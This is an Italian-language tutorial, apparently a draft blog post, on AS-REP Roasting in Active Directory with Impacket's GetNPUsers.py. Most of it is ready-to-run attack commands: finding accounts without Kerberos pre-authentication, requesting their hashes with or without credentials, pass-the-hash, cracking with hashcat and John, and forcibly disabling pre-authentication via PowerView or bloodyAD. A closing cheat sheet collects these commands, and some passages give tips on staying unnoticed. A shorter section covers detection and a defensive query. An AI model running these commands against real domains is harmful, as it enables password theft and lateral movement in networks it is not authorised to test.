---
title: 'GetNPUsers.py: AS-REP Roasting con Impacket'
slug: getnpusers
description: 'Guida a GetNPUsers.py di Impacket per trovare account senza pre-autenticazione Kerberos, estrarre hash AS-REP e craccarli offline con Hashcat.'
image: /getnpusers-as-rep-roasting-impacket.webp
draft: true
date: 2026-07-25T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - as-rep-roasting
  - no-preauth
  - password-cracking
  - active-directory
---

# Come usare GetNPUsers.py per individuare account AS-REP Roastable in Active Directory

`GetNPUsers.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) e individua account Active Directory sui quali l'opzione **"Do not require Kerberos preauthentication" è abilitata** (flag `UF_DONT_REQUIRE_PREAUTH`) — cioè account che il KDC accetta di autenticare senza la normale prova crittografica preventiva. Per quegli account chiunque può richiedere un AS-REP: la risposta contiene materiale cifrato con la chiave Kerberos a lungo termine derivata dalla password dell'account, materiale che puoi sottoporre a cracking offline per verificare password candidate.

La tecnica è nota come **AS-REP Roasting**, pubblicata originalmente da [@harmj0y](https://blog.harmj0y.net/activedirectory/roasting-as-reps/). Il ticket ricevuto non diventa direttamente utilizzabile solo perché lo hai ottenuto — senza conoscere la chiave dell'account non puoi decifrarne correttamente la parte necessaria; serve prima il crack offline.

Il flusso completo del [TGT](https://hackita.it/articoli/tgt-kerberos/) e del protocollo [Kerberos](https://hackita.it/articoli/kerberos/) è descritto negli articoli dedicati. Qui ci concentriamo sull'esecuzione pratica.

Riferimento ufficiale: [fortra/impacket — GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
MITRE ATT\&CK: [T1558.004 — AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)

## Sintassi e opzioni reali

```bash
impacket-GetNPUsers [opzioni] dominio/[utente[:password]]
```

| Opzione                  | Descrizione                                                                   |
| ------------------------ | ----------------------------------------------------------------------------- |
| `-request`               | Dopo l'enumerazione LDAP, richiede gli AS-REP degli utenti trovati            |
| `-outputfile FILE`       | Scrive gli hash su file — **abilita automaticamente `-request`**              |
| `-format {hashcat,john}` | Formato output (default: hashcat)                                             |
| `-usersfile FILE`        | Prova direttamente gli utenti nel file, uno per riga — bypassa del tutto LDAP |
| `-no-pass`               | Non chiede la password                                                        |
| `-hashes LM:NT`          | Pass-the-Hash per l'autenticazione LDAP                                       |
| `-k`                     | Kerberos con ccache                                                           |
| `-aesKey KEY`            | Chiave AES (128 o 256 bit) per l'autenticazione Kerberos                      |
| `-dc-ip IP`              | IP del Domain Controller                                                      |
| `-dc-host HOST`          | Hostname del Domain Controller                                                |
| `-ts`                    | Timestamp nei log                                                             |
| `-debug`                 | Output verboso                                                                |

## `-request` non è sempre necessario

Dipende dal flusso che usi:

* **Enumerazione LDAP autenticata:** qui `-request` serve davvero per passare dalla lista di account vulnerabili alla richiesta effettiva degli AS-REP.
* **Con `-outputfile`:** il codice imposta automaticamente `request=True` quando specifichi questo flag — non serve aggiungere `-request` a mano.
* **Con `-usersfile`:** il tool tenta direttamente la richiesta per ogni nome nel file, bypassando completamente l'enumerazione LDAP — `-request` qui è ignorato/non necessario.
* **Singolo utente senza credenziali:** stesso discorso, richiede direttamente l'AS-REP.

## Modalità 1 — Con credenziali (enumerazione LDAP + richiesta)

Hai credenziali low-privilege: GetNPUsers interroga LDAP e trova gli account con `UF_DONT_REQUIRE_PREAUTH` settato (escludendo account disabilitati e computer object), poi — solo se richiesto — ne chiede l'AS-REP.

```bash
# Solo enumerazione: elenca gli account vulnerabili senza richiedere gli hash
impacket-GetNPUsers corp.local/user:'Password123!' -dc-ip 10.10.10.5
```

L'output dell'enumerazione mostra `Name`, `MemberOf`, `PasswordLastSet`, `LastLogon`, `UAC` — non solo la lista nuda di username.

```bash
# Enumera E richiede gli hash in formato hashcat — il comando più usato
impacket-GetNPUsers corp.local/user:Password123 -dc-ip 10.10.10.5 \
  -request -format hashcat -outputfile asrep_hashes.txt

# Pass-the-Hash per l'autenticazione LDAP
impacket-GetNPUsers -hashes :NThash corp.local/user -dc-ip 10.10.10.5 \
  -request -format hashcat -outputfile asrep_hashes.txt

# Kerberos
export KRB5CCNAME=ticket.ccache
impacket-GetNPUsers -k -no-pass corp.local/user -dc-ip 10.10.10.5 \
  -request -format hashcat -outputfile asrep_hashes.txt
```

**Limite da conoscere:** la query LDAP di questo flusso ha un `sizeLimit` di 999 risultati e **non è paginata**. In domini enormi con più di 999 account che soddisfano il filtro, l'output potrebbe risultare incompleto — raro in pratica, dato che pochi domini hanno così tanti account no-preauth, ma vale la pena saperlo.

**Output quando trova account vulnerabili:**

```
$krb5asrep$23$john.doe@CORP.LOCAL:a1b2c3d4e5f6...longerhash...

[*] Getting TGT for svc_backup
$krb5asrep$23$svc_backup@CORP.LOCAL:f7e8d9c0b1a2...longerhash...
```

**Output quando non trova nulla:**

```
No entries found!
```

## Modalità 2 — Senza credenziali (con lista username)

Non hai credenziali di dominio ma hai una lista di username (da OSINT, LinkedIn, enumerazione anonima). GetNPUsers testa ogni username contro il KDC direttamente sulla porta 88, senza passare da LDAP.

```bash
# Senza credenziali — testa username da file
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.5 \
  -no-pass -usersfile userlist.txt \
  -format hashcat -outputfile asrep_hashes.txt

# Singolo utente senza credenziali
impacket-GetNPUsers corp.local/john.doe -dc-ip 10.10.10.5 -no-pass
```

**Attenzione con `-no-pass`:** quando testi un singolo account senza conoscerne la password, specifica sempre `-no-pass`. Se ometti il flag, il tool può chiederti una password interattivamente — un tentativo di autenticazione fallito genera comunque traffico e incide sul contatore `badPwdCount` dell'account, un dettaglio non innocuo se stai cercando di restare sotto il radar.

Il file `-usersfile` deve contenere solo gli username, senza dominio e senza `@`. Un username per riga:

```
administrator
john.doe
svc_backup
helpdesk
```

## RC4 e AES con GetNPUsers.py

`GetNPUsers.py` richiede inizialmente un AS-REP cifrato con **RC4** (etype 23). Se il KDC risponde `KDC_ERR_ETYPE_NOSUPP` (RC4 non supportato per quell'account), il tool ripete automaticamente la richiesta offrendo **AES256** ed **AES128**. Non è quindi un caso teorico o raro — dipende semplicemente da come è configurato l'account e dal dominio, e capita più spesso di quanto si pensi in ambienti che hanno disabilitato RC4.

Il tipo di hash restituito determina quale modalità Hashcat usare — vedi la tabella sotto.

## Crack degli hash — modalità Hashcat corrette

Le modalità Hashcat per gli AS-REP sono specifiche e diverse da quelle per il Kerberoasting (TGS) o per il pre-auth — non vanno confuse:

| Prefisso hash    | Etype         | Modalità Hashcat |
| ---------------- | ------------- | ---------------- |
| `$krb5asrep$23$` | 23 — RC4-HMAC | `18200`          |
| `$krb5asrep$17$` | 17 — AES128   | `32100`          |
| `$krb5asrep$18$` | 18 — AES256   | `32200`          |

**Attenzione a non confondere decimale ed esadecimale:** nel formato hash di Hashcat, `18` è decimale e indica AES256. Nei log di Windows invece l'encryption type viene mostrato in esadecimale — lì AES256 è `0x12` e RC4-HMAC è `0x17`. Sono numerazioni diverse per lo stesso concetto, e scambiarle è un errore comune.

```bash
# AS-REP RC4, etype 23 (il caso più comune)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP AES128, etype 17
hashcat -m 32100 asrep_hashes.txt rockyou.txt

# AS-REP AES256, etype 18
hashcat -m 32200 asrep_hashes.txt rockyou.txt

# Con regole (aumenta coverage)
hashcat -m 18200 asrep_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper (se hai salvato in formato john)
john --format=krb5asrep asrep_hashes.txt --wordlist=rockyou.txt
```

## Workflow tipico

```
1. GetADUsers.py -all → lista utenti del dominio
       │
       ↓
2. GetNPUsers.py con creds → enumera via LDAP gli account no-preauth
   OPPURE
   GetNPUsers.py senza creds + -usersfile → testa username da OSINT

       │
       ↓
3. hashcat -m 18200/32100/32200 → cracca offline in base all'etype

       │
       ↓
4. Password in chiaro → verifica accesso
   nxc smb DC_IP -u john.doe -p 'CraccataPass' -d corp.local

       │
       ↓
5. Con le nuove credenziali → ripeti enumerazione, pivot, lateral movement
```

## AS-REP Roasting forzato — con GenericAll o GenericWrite

Se hai `GenericAll` o `GenericWrite` su un account (verificabile con [BloodHound](https://hackita.it/articoli/bloodhound/)), puoi **disabilitare manualmente la pre-autenticazione** su quell'account, roastarlo, e poi riabilitarla:

```powershell
# Con PowerView — disabilita pre-auth (toggle via XOR su userAccountControl)
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304} -Verbose

# Poi da Kali: GetNPUsers.py → ottieni hash → cracca

# Riabilita pre-auth dopo il crack
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304} -Verbose
```

[PowerView](https://hackita.it/articoli/powerview/) è lo strumento che espone `Get-DomainUser`/`Set-DomainObject` usati qui e nell'enumerazione preventiva più sotto.

**Attenzione con `-XOR`:** inverte il bit, non lo imposta a un valore fisso. Eseguire il comando due volte torna allo stato precedente solo se nessun altro modifica l'attributo nel frattempo e se conoscevi lo stato iniziale. Controlla sempre prima e dopo:

```powershell
Get-DomainUser target_user -Properties userAccountControl | ConvertFrom-UACValue
```

Con [bloodyAD](https://hackita.it/articoli/bloodyad/) (da Kali, se hai GenericWrite), che usa azioni esplicite `add`/`remove` invece del toggle XOR — più sicuro perché non rischi di invertire lo stato sbagliato:

```bash
bloodyAD -u user -p 'pass' -d corp.local --host 10.10.10.5 add uac -f DONT_REQ_PREAUTH target_user

# Poi GetNPUsers.py → cracca

# Cleanup
bloodyAD -u user -p 'pass' -d corp.local --host 10.10.10.5 remove uac -f DONT_REQ_PREAUTH target_user
```

## Enumerazione preventiva prima del roasting

Prima di lanciare direttamente GetNPUsers, puoi verificare quali account hanno il flag con altri strumenti:

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired
```

```bash
# bloodyAD — query LDAP diretta sul bit UF_DONT_REQUIRE_PREAUTH
bloodyAD -u user -p 'Password123!' -d corp.local --host 10.10.10.5 get search \
  --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
  --attr sAMAccountName
```

## NetExec — alternativa moderna

```bash
nxc ldap 10.10.10.5 -u user -p 'Password123!' --asreproast asrep_hashes.txt --kdcHost DC01.corp.local
```

## Rubeus — equivalente da Windows

```powershell
# Tutti gli account vulnerabili
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Utente specifico
.\Rubeus.exe asreproast /user:john.doe /format:hashcat /outfile:hashes.txt

# Una OU specifica
.\Rubeus.exe asreproast /ou:"OU=Service Accounts,DC=corp,DC=local" /format:hashcat /outfile:hashes.txt

# Query LDAP tramite LDAPS
.\Rubeus.exe asreproast /ldaps /format:hashcat /outfile:hashes.txt

# Richiesta AES
.\Rubeus.exe asreproast /aes /format:hashcat /outfile:hashes.aes
```

`/aes` richiede un AS-REP cifrato in AES — evita il segnale specifico del downgrade a RC4, ma la richiesta Kerberos senza pre-autenticazione resta comunque osservabile sul Domain Controller e sulla rete. Non è "invisibile", solo diverso dal punto di vista della telemetria.

## Tecnica correlata — ASRepCatcher

**Non è una funzione di GetNPUsers.py.** ASRepCatcher opera da una posizione man-in-the-middle sulla rete e lavora in due modalità: `listen` cattura passivamente qualunque AS-REP negoziato tra client e DC così com'è; `relay` invece si comporta da proxy attivo e può **forzare il downgrade a RC4** anche quando il client offre AES (etype 23) — funziona quindi per qualsiasi utente sulla VLAN, senza bisogno che la pre-authentication sia disabilitata sull'account. È un vettore distinto da GetNPUsers.py, con condizioni di rete diverse (serve poter interporsi nel traffico) — non va mescolato nel workflow di roasting classico.

## Tecniche avanzate correlate agli account senza pre-authentication

**CVE-2022-33679 (Charlie Clark, 2022):** se un principal non richiede pre-authentication, è possibile costruire una richiesta KRB\_AS\_REQ modificata nell'`sname` del corpo della richiesta per ottenere un **Service Ticket** invece del normale TGT/AS-REP — senza controllare alcun account di dominio, proprio come l'AS-REP Roasting classico. È un argomento avanzato e distinto, non una funzione di GetNPUsers.py: qui lo segnaliamo solo come consapevolezza, senza confonderlo con il flusso base descritto in questo articolo.

## Detection

Una singola regola tipo "Event 4768 senza pre-auth = AS-REP Roasting" genera falsi positivi: un account legittimamente configurato senza pre-auth produce lo stesso evento durante una richiesta normale. La correlazione va fatta su più segnali:

| Indicatore                                                 | Significato                                                                                                               |
| ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| Event ID `4768`                                            | Richiesta di un TGT                                                                                                       |
| Event ID `4771`                                            | Pre-authentication Kerberos fallita — segnale complementare al 4768, utile su richieste che falliscono invece di riuscire |
| Pre-authentication Type assente                            | Account o richiesta senza pre-auth                                                                                        |
| Service Name `krbtgt`                                      | Richiesta AS per un TGT                                                                                                   |
| Encryption type `0x17`                                     | RC4-HMAC                                                                                                                  |
| Encryption type `0x11`                                     | AES128                                                                                                                    |
| Encryption type `0x12`                                     | AES256                                                                                                                    |
| Molti username diversi dalla stessa sorgente in poco tempo | Possibile enumerazione/roasting massivo                                                                                   |
| Processo non abituale che comunica su TCP/UDP 88           | Possibile tool Kerberos custom, non un client Windows nativo                                                              |

**Come cercare account vulnerabili lato difesa:**

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
  Select-Object SamAccountName, DoesNotRequirePreAuth
```

Queste configurazioni sono spesso il residuo di setup legacy Exchange o applicazioni che non supportano la Kerberos pre-auth standard — non sempre un errore di configurazione recente.

## Errori comuni

| Errore                        | Causa                                          | Soluzione                                               |
| ----------------------------- | ---------------------------------------------- | ------------------------------------------------------- |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username non esiste nel dominio                | Verifica la lista utenti                                |
| `No entries found!`           | Nessun account senza pre-auth trovato via LDAP | Dominio configurato correttamente — prova Kerberoasting |
| `KDC_ERR_PREAUTH_REQUIRED`    | L'account testato ha la pre-auth abilitata     | Account non vulnerabile, normale                        |
| Output vuoto con `-usersfile` | Nessun account nella lista è vulnerabile       | Nessun AS-REP Roastable in quella lista                 |
| Hash non si cracca            | Password robusta o non in wordlist             | Prova regole hashcat, mask attack, o wordlist diversa   |

## Domande frequenti

**GetNPUsers.py funziona senza credenziali?**
Sì, con `-usersfile` e `-no-pass` — testa direttamente ogni username contro il KDC senza mai passare da LDAP.

**`-request` è sempre necessario?**
No. Serve solo nel flusso di enumerazione LDAP autenticata. Con `-outputfile` viene impostato automaticamente, e con `-usersfile` o un singolo utente il tool richiede direttamente senza bisogno del flag.

**Quale modalità Hashcat devo usare?**
Dipende dal prefisso dell'hash: `$krb5asrep$23$` → `-m 18200` (RC4), `$krb5asrep$17$` → `-m 32100` (AES128), `$krb5asrep$18$` → `-m 32200` (AES256).

**Un AS-REP ottenuto è direttamente utilizzabile come ticket?**
No. Contiene solo materiale cifrato con la chiave dell'account, craccabile offline. Senza la password non puoi decifrarlo né usarlo per autenticarti.

**Qual è la differenza tra AS-REP Roasting e Kerberoasting?**
L'AS-REP Roasting sfrutta account senza pre-authentication (`UF_DONT_REQUIRE_PREAUTH`) e non richiede credenziali di dominio nella modalità userlist. Il Kerberoasting richiede credenziali valide e sfrutta account con un `servicePrincipalName` configurato — lo strumento equivalente è [GetUserSPNs.py](https://hackita.it/articoli/getuserspns/), indipendentemente dalla pre-auth.

## Cheat Sheet

```bash
# Solo enumerazione (nessuna richiesta hash)
impacket-GetNPUsers corp.local/user:pass -dc-ip DC_IP

# Con credenziali — enumera e richiede
impacket-GetNPUsers corp.local/user:pass -dc-ip DC_IP \
  -request -format hashcat -outputfile hashes.txt

# Senza credenziali — lista username
impacket-GetNPUsers corp.local/ -dc-ip DC_IP \
  -no-pass -usersfile users.txt -format hashcat -outputfile hashes.txt

# Singolo utente senza credenziali
impacket-GetNPUsers corp.local/john.doe -dc-ip DC_IP -no-pass

# Pass-the-Hash
impacket-GetNPUsers -hashes :NThash corp.local/user -dc-ip DC_IP \
  -request -format hashcat -outputfile hashes.txt

# Crack RC4 (più comune)
hashcat -m 18200 hashes.txt rockyou.txt

# Crack AES128 / AES256
hashcat -m 32100 hashes.txt rockyou.txt
hashcat -m 32200 hashes.txt rockyou.txt

# Verifica account vulnerabili (lato difesa/enumerazione)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Forza no-preauth con bloodyAD + cleanup
bloodyAD -u user -p 'pass' -d corp.local --host DC_IP add uac -f DONT_REQ_PREAUTH target_user
# → GetNPUsers.py → cracca
bloodyAD -u user -p 'pass' -d corp.local --host DC_IP remove uac -f DONT_REQ_PREAUTH target_user
```

## Articoli correlati

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Kerberos: architettura e flusso](https://hackita.it/articoli/kerberos/)
* [TGT Kerberos](https://hackita.it/articoli/tgt-kerberos/)
* [AS-REP Roasting: guida completa](https://hackita.it/articoli/as-rep-roasting/)
* [GetUserSPNs.py — Kerberoasting](https://hackita.it/articoli/getuserspns/)
* [PowerView](https://hackita.it/articoli/powerview/)
* [Rubeus](https://hackita.it/articoli/rubeus/)
* [Hashcat](https://hackita.it/articoli/hashcat/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
* [Active Directory: guida all'exploitation](https://hackita.it/articoli/active-directory/)

> Uso esclusivo in ambienti autorizzati.
